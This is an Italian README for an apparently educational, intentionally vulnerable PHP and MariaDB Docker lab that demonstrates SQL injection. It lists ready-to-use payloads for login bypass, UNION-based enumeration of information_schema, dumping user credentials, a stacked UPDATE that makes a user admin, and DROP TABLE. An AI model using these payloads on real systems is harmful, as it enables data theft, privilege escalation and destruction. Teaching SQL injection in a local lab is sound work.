# SQL Injection Demo App (PHP + MariaDB + Docker)

Questa applicazione è stata creata per scopi didattici e dimostra le vulnerabilità SQL Injection più comuni in un contesto web.

---

## Funzionalità

- Login vulnerabile (tautologia)
- Dashboard con elenco parziale dei dati degli utenti
- Form di ricerca email vulnerabile a:
  - UNION SELECT
  - Esfiltrazione dati da `information_schema`
  - Piggybacking (`DROP`, `UPDATE`)
- Style CSS semplice incluso

---

## Tecnologie

- PHP (senza framework)
- MariaDB 10.5
- Docker & Docker Compose

---

## Requisiti

Per eseguire correttamente il progetto sono necessari i seguenti strumenti:

- Docker Desktop installato e funzionante sul proprio sistema (macOS, Windows o Linux). Docker viene utilizzato per creare ed eseguire i container dell’applicazione e del database.
- Docker Compose deve essere disponibile nel sistema. Nella maggior parte dei casi è incluso direttamente in Docker Desktop, ma in ambienti Linux potrebbe essere necessario installarlo separatamente.
-	Database MariaDB o MySQL: il progetto utilizza MariaDB (via container Docker), ma è compatibile anche con MySQL. Il database viene inizializzato automaticamente tramite uno script SQL (init.sql) incluso nel progetto, quindi non è necessaria alcuna configurazione manuale.

---

## Avvio dell'applicazione

1. Clona il progetto

```bash
git clone https://github.com/BlackCodeReaper/sqli-project.git
cd sqli-project
```

2. Avvia i container

```bash
docker-compose up --build
```

L'app sarà disponibile su `http://localhost:8080/login.html`

---

## Login di esempio

Tautologia:
```
Username: ' OR 1=1 #
Password: qualsiasi
```

Credenziali reali:
```
Username: admin
Password: admin123
```

---

## Esecuzione di attacchi SQLi

Tautologia:
```
' OR 1=1 #
```

Scoprire nome database:
```
' UNION SELECT 'Nome database:', DATABASE(), '', '', '' #
```

Elencare tutti gli schemi:
```
' UNION SELECT schema_name, '', '', '', '' FROM information_schema.schemata #
```

Elencare tabelle:
```
' UNION SELECT 'Nome tabella:', table_name, '', '', '' FROM information_schema.tables WHERE table_schema='sqli_project' #
```

Elencare colonne:
```
' UNION SELECT 'Nome colonna:', column_name, '', '', '' FROM information_schema.columns WHERE table_name='utenti' AND table_schema='sqli_project' #
```

Leggere credenziali:
```
'UNION SELECT 'ID', 'username', 'password', 'email', 'telefono' UNION SELECT id, username, password, email, telefono FROM utenti #
```

Aggiornare un utente:
```
' ; UPDATE utenti SET ruolo = 'admin' WHERE username = 'user1'; --
```

Cancellare la tabella:
```
' ; DROP TABLE utenti; --
```

---

## Ripristino del database

Se la tabella o il database vengono eliminati durante i test, puoi ricostruire tutto con:

```bash
docker-compose down -v
docker-compose up --build
```

---

## Crediti

Progetto sviluppato per scopi didattici. **Non usare in ambienti di produzione.**